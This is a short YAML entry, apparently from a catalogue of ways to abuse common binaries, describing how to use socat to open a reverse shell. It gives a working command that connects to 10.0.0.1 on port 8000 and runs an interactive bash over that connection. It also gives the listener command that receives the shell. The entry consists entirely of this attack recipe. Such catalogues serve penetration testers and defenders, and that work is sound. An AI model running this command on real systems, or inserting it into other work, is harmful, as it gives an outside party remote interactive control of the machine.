---
functions:
  reverse-shell:
    - description: Run <code>socat file:`tty`,raw,echo=0 tcp-listen:8000</code> to receive the shell on the other end.
      code: |
        RHOST=10.0.0.1
        RPORT=8000 
        socat tcp-connect:$RHOST:$RPORT exec:"bash -li",pty,stderr,setsid,sigint,sane
---